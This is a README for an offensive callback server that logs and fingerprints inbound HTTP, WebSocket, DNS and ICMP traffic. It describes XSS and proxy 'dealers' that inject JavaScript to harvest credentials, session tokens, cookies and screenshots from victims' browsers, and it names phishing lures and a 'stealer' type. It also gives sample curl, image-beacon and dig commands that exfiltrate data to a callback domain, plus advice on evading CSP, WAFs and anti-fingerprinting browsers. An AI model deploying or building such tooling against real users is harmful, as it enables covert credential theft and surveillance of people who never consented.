# OFFENSIVE CALLBACK

**Multi-protocol device offensive callback server**

---

> OFFENSIVE CALLBACK is a passive intelligence collection framework for offensive security operations. It captures, fingerprints, and cross-correlates inbound traffic across HTTP(S), WebSocket, DNS and ICMP simultaneously — enriching every hit with browser telemetry, device hardware data, geolocation and automated OSINT.


```
                    ┌─────────────────────────────────────────┐
                    │           OFFENSIVE CALLBACK            │
                    │            Node.js / Express            │
                    ├──────────┬──────────┬───────┬───────────┤
                    │  HTTP(S) │    WS    │  DNS  │   ICMP    │
                    │  :80/443 │  shared  │  :53  │  raw sock │ (SMTP & SMB ON DEV)
                    └────┬─────┴────┬─────┴───┬───┴─────┬─────┘
                         │          │         │         │
              ┌──────────▼──────────▼─────────▼─────────▼──────────┐
              │                  SQLite Database                   │
              │  Logs · IPs · Files ·            DNS · OSINT Data  │
              └──────────────────────┬─────────────────────────────┘
                                     │
                    ┌────────────────▼───────────────────┐
                    │           Web Dashboards           │
                    │  /index · /callback · /dashboard   │
                    │  /scanners · /files · /options     │
                    └────────────────────────────────────┘
```

All four protocols feed a **single unified SQLite database**. Every log entry is enriched with: browser fingerprint (`Fu`/`Fb`/`Jd`), GeoIP, WHOIS, optional OSINT (Shodan, CriminalIP, VirusTotal, InfoDB) and file exfiltration links.

---
## Installation

```bash
git clone https://github.com/jomoza/5ELG
cd 5ELG
npm install
# Copy and configure environment
cp .env.example .env
nano .env
# Start
node index.js
# Or with root (required for DNS + ICMP)
sudo node index.js
```

**Requirements:** Node.js 18+, root privileges for DNS (port 53) and ICMP (raw socket).

---
## Environment Variables

| Variable             | Default             | Description                                |
| -------------------- | ------------------- | ------------------------------------------ |
| `HOST`               | `0.0.0.0`           | Bind interface                             |
| `DOMAIN`             | —                   | Primary domain (used in dealer URLs)       |
| `PORT`               | `80`                | HTTP port                                  |
| `SSL_PORT`           | `443`               | HTTPS port                                 |
| `SSL_KEY_PATH`       | —                   | Path to TLS private key                    |
| `SSL_CERT_PATH`      | —                   | Path to TLS certificate                    |
| `HTTP_SERVER`        | `true`              | Enable HTTP(S) listener                    |
| `WS_SERVER`          | `true`              | Enable WebSocket server (shares HTTP port) |
| `DNS_SERVER`         | `false`             | Enable DNS server                          |
| `DNS_PORT`           | `53`                | DNS port (root required)                   |
| `DNS_RELAY`          | `false`             | Forward unknown queries upstream           |
| `DNS_RELAY_IP`       | `1.1.1.1`           | Upstream DNS for relay mode                |
| `ICMP_LISTENER`      | `false`             | Enable ICMP ping listener (root required)  |
| `DB_PATH`            | `./db.sqlite`       | SQLite database path                       |
| `UPLOAD_PATH`        | `./Sources/uploads` | Uploaded file storage                      |
| `BACKUP_PATH`        | `./Sources/backups` | CSV backup storage                         |
| `DEALERS_PATH`       | `./Sources/dealers` | Dealer file storage                        |
| `SHODAN_API_KEY`     | —                   | Shodan API key                             |
| `CRIMINALIP_API_KEY` | —                   | CriminalIP API key                         |
| `VIRUSTOTAL_KEY`     | —                   | VirusTotal API key                         |
| `INFODB_KEY`         | —                   | InfoDB API key                             |
| `TELEGRAM_NOTIF`     | `false`             | Telegram alert notifications               |
| `DISCORD_NOTIF`      | `false`             | Discord alert notifications                |
| `VELG_USER`          | `admin`             | Web UI username                            |
| `VELG_PWD`           | —                   | Web UI password                            |

---
## Security Notes

- Deploy behind a reverse proxy (nginx/Caddy) with valid TLS for production use
- Protect the web interface — change from defaults admin:admin credentials.
- OSINT API keys are stored in `.env` — never commit this file
- DNS server on port 53 requires root; consider using a port redirect (`iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353`) and running the process as a non-root user
- ICMP listener requires root; same approach applies
- The SQLite database contains sensitive fingerprint and OSINT data — protect file permissions accordingly (`chmod 600 db.sqlite`)
- All dealer files in `DEALERS_PATH` are served publicly — do not place sensitive files there

---
## Dealers
### What is a Dealer

A **dealer** is a server-side endpoint registered in `dealers.json`. When an HTTP request matches a dealer's alias or path, the server executes the dealer's configured behaviour — serving a file, performing a redirect, proxying a remote site, or responding with a pixel — while always logging the hit.

Dealers are the collection points. Once deployed (embedded in a page, sent in an email, delivered via XSS, or served through a proxy chain), they silently gather telemetry and send it back to the server.
### Dealer Routing Logic

On every inbound request, the dealer engine applies this lookup chain:

```
1. Match URL path against aliases[]  (exact or prefix match)
   → Aliases starting with "/" are used as-is
   → Others are prepended with "/"

2. If no path match, check ?dl= query parameter against id / aliases (by name)

3. If no match → sendPixel() — return 1×1 transparent PNG
```

If a matched dealer is **inactive** (`status: "inactive"`), the request is dropped and `sendPixel()` is returned — no logging, no enrichment.

---
### Dealer Types

| Type                            | Description                                                                                                                                                      |
| ------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `XSS`                           | JavaScript payload for browser injection. Served as `.js` or wrapped in HTML. Primary fingerprinting vector.                                                     |
| `XSS-PROXY`                     | Transparent proxy that injects the JS dealer into every HTML response it proxies. Captures session tokens, form submissions, and credentials from proxied pages. |
| `HTML`                          | Serve a raw HTML file. Can contain any payload: CSS tracking, pixel embeds, custom pages, phishing lures.                                                        |
| `URL-REDIRECT`                  | Log the hit then redirect to `redirect`. The redirect can carry the injected dealer via a wrapper page.                                                          |
| `URL`                           | Serve a URL or act as a file endpoint. Used for serving static dealer assets.                                                                                    |
| `PHP-PROXY`                     | PHP-based transparent proxy. Mirrors a target site and injects collection code.                                                                                  |
| `JSP-PROXY` / `ASP-PROXY` / ... | JSP / ASP variants of the proxy dealer.                                                                                                                          |
| `powershell`                    | Serve a PowerShell script. For Windows server-side recon: hostname, ARP, connections, installed software, current user.                                          |
| `bash` / `sh`                   | Serve a Bash/sh script. For Linux recon: kernel, hostname, processes, interfaces, open ports.                                                                    |
| `stealer`                       | Dedicated credential / data capture dealer.                                                                                                                      |
| `COPY/PASTE`                    | Payload designed to be copy-pasted into a browser console or document.                                                                                           |

---

### Dealer Configuration Schema

```jsonc
{
  "id":           "UNIQUE-ID",          // Identifier, used in logs as Dl field
  "name":         "Human-readable name",
  "description":  "What this dealer does",
  "type":         "XSS",               // See Dealer Types table
  "isproxy":      false,               // Transparent proxy mode
  "status":       "active",            // "active" | "inactive"
  "redirect":     "https://target.com",// Redirect URL (optional)
  "aliases": [                         // URL paths and name aliases
    "main-dealer",
    "/dl",
    "/dealer"
  ],
  "urls": [                            // Domain reference (shown in UI)
    "https://your-domain.com"
  ],
  "loot":         "0",                 // "1" = loot mode, "0" = normal
  "file":         "default/dl.full.min.js",  // File relative to DEALERS_PATH
  "total_requests": 0,                 // Auto-incremented by server
  "time_request": {}                   // Timestamps (managed by server)
}
```

---
## Browser fingerprinting

The primary collection agent is a JavaScript payload served by the XSS dealer. When executed in a browser context it:
1. Computes the browser **fingerprint** (`Fu` — SHA-256 of canvas + fonts + WebGL) and **canvas hash** (`Fb`)
2. Collects the full **device JSON** (`Jd`) — hardware specs, GPU, battery, network, screen, languages, timezone, plugins
3. Takes a **screenshot** of the current page (via html2canvas or native APIs) and exfiltrates it as base64
4. Intercepts **POST submissions** on the page (form captures, credential harvesting)
5. Opens a **WebSocket connection** for real-time and continuous streaming
6. Runs an optional **LAN network scanner** and reports internal network topology
7. Dumps **localStorage**, **sessionStorage**, **cookies** (where accessible), and any visible **API keys** or **JWT tokens** in page context
All data is sent back to the server over the existing HTTP/WS channels. The request is visually indistinguishable from a normal asset load.

---

### Fingerprint Fields

|Field|Description|
|---|---|
|`Fu`|SHA-256 browser fingerprint. Stable across sessions, tabs, and IP changes. Primary identifier.|
|`Fb`|Canvas rendering hash. Identifies GPU/driver combinations for cross-browser device profiling.|
|`Jd`|Base64-encoded device JSON (see Jd Device Payload below).|
|`Ip`|Source IP address.|
|`Ua`|User-Agent string.|
|`Dl`|Dealer identifier (which dealer served the request).|
|`Er`|Base64-encoded request envelope (method, URL, headers, body).|
|`Ts`|Timestamp of the request.|
|`Fr`|Session fingerprint reference (links screenshots to logs).|

---

### JD (JSON of Device) Device Browser Fingerprint Information

The `Jd` field is a base64-encoded JSON object with the following structure:

```jsonc
{
  "deviceData": {
    "platform":            "Win32",
    "hardwareConcurrency": 8,         // CPU cores
    "deviceMemory":        16,        // RAM in GB
    "maxTouchPoints":      0,         // Touch screen detection
    "languages":           ["en-US", "en"],
    "timezone":            "Europe/Madrid",
    "screen": {
      "width": 1920, "height": 1080
    },
    "devicePixelRatio":    2.0,
    "vendor":              "Google Inc."
  },
  "gpuData": {
    "renderer":    "NVIDIA GeForce RTX 3080 ...",
    "vendor":      "Google Inc. (NVIDIA)",
    "colorDepth":  24
  },
  "browserData": {
    "userAgent":       "Mozilla/5.0 ...",
    "cookieEnabled":   true,
    "adBlockEnabled":  false,
    "batteryData": {
      "level":    0.87,
      "charging": false
    },
    "networkInfo": {
      "effectiveType": "4g",
      "downlink":      25.5
    },
    "memoryInfo": {
      "usedJSHeapSize": 42000000
    },
    "plugins": ["PDF Viewer", "Chrome PDF Viewer"],
    "rtcdata":  null                  // RTC local IP (if leaking)
  }
}
```

---

### CSS & NoScript Tracking

When JavaScript is blocked or unavailable, the CSS dealer (`CSS-TRACKING-DEMO`) provides passive telemetry through pure CSS:

- **`@font-face` probes** — OS-specific font loading reveals Windows / macOS / Linux / iOS / Android
- **`@supports` rules** — detect CSS engine differences between Chrome, Firefox, Safari, Edge
- **`@media` queries** — screen resolution, `prefers-color-scheme`, `prefers-reduced-motion`, `pointer: coarse` (touch detection), `hover`, HDR capability
- **Image pixel beacons** — each CSS rule that fires requests a unique 1×1 image from the server, logging which probe matched
Result: detailed OS + browser + hardware profile with zero JavaScript.



---

## Data Exfiltration

OFFENSIVE CALLBACK receives data from implants and dealers through multiple protocols. Every technique below logs the full request — IP, headers, path, payload — to the SQLite database and associates it with the matching dealer.

---

### HTTP Exfiltration

HTTP is the most versatile channel. Data can be encoded into URL parameters, custom headers, the request body, or the referrer. Any inbound HTTP request is logged regardless of path or method.

**Via URL parameters and headers:**

```bash
curl -I "https://your-domain.com/dealer/beacon.png?data=LEAKED-VALUE"
```

**POST body:**

```bash
curl -X POST "https://your-domain.com/dealer" \
  -H "Content-Type: application/json" \
  -d 'LEAKED-DATA' 
```

**IMG Ping:**

```html
<img src=https://callback-domain.com/dealer>
```

**Basic lookup — registers source IP and queried name:**

```bash
dig @your-domain.com LEAKED-DATA.your-domain.com A
```



---

## Limitations

Browser fingerprinting through JavaScript is effective but operates within the browser security model. The following constraints apply.

### Mixed Content
Browsers block insecure (HTTP) resources loaded inside secure (HTTPS) pages. If a dealer is served over HTTP and embedded in an HTTPS target, the script is silently dropped. **Mitigation:** always serve dealers over HTTPS with a valid, trusted certificate. Configure `SSL_KEY_PATH` / `SSL_CERT_PATH` in `.env`.

### Invalid TLS Certificate
If the server presents an untrusted or self-signed certificate, the browser refuses the connection before the dealer executes (`NET::ERR_CERT_AUTHORITY_INVALID`). **Mitigation:** use a certificate from a public CA (Let's Encrypt, ZeroSSL). The CSS pixel-beacon fallback is less affected since images are often loaded cross-origin without strict cert checks.

### CORS Restrictions
When a dealer POSTs data to the callback server from a third-party origin, browsers enforce CORS. If the server does not return `Access-Control-Allow-Origin` for that origin, the browser blocks the response — however, the request itself still reaches the server and is logged. OFFENSIVE CALLBACK returns permissive CORS headers by default; ensure your reverse proxy does not strip them.

### Content-Security-Policy (CSP)
Targets enforcing strict CSP (`script-src`, `connect-src`, `img-src`) can block both dealer execution and outbound connections. **Partial bypass:** the CSS-only dealer (`CSS-TRACKING-DEMO`) uses only `@font-face` image loads, which are controlled by `img-src` rather than `script-src`, and survives many `script-src 'none'` configurations. DNS exfiltration is unaffected by HTTP-level CSP.

### Browser Anti-Fingerprinting
Browsers like Firefox (`privacy.resistFingerprinting`), Brave (randomised canvas/WebGL noise), and Tor Browser deliberately spoof or randomise fingerprinting surfaces. Cards in the Fingerprint Dashboard are flagged **Inconsistent** when multiple Jd payloads for the same `Fu` show high variance across fields — a signal of active anti-fingerprinting countermeasures.

### Browser Silent Updates
Major browser updates can change canvas rendering algorithms (affecting `Fu` stability), restrict battery or network APIs, or add new noise to timing functions. Fingerprints from the same device may diverge after an update. The `Fb` canvas hash is more sensitive to rendering changes than `Fu`.

### Web Application Firewalls (WAFs)
WAFs can identify and block fingerprinting patterns — unusual header combinations, high-frequency requests from a single IP, or known script signatures. The 1×1 pixel fallback and DNS channel are the least likely vectors to trigger WAF rules. Rotating dealer aliases and using generic file names (`.png`, `.gif`, `.woff`) reduces detection surface.

---

## Links

- [How to track privacy-lovers browsers](https://loveisinthe.net/blog/2023/05/10/How-to-track-privacy-lovers-browser/)
- [More in JS Fingerprint World](https://loveisinthe.net/blog/2023/01/07/MORE-IN-JS-FINGERPRINT-WORLD/)
- [Client-Side Hacking Introduction](https://loveisinthe.net/blog/2021/10/25/Cl13nt-SId3-H4cKing-Introduction/)
- [Browser Fingerprinting Techniques — fingerprint.com](https://fingerprint.com/blog/browser-fingerprinting-techniques/)
- [Am I Unique? — Fingerprint entropy test](https://amiunique.org/)
- [ExoSunand](https://exosunand.net/)

---

---
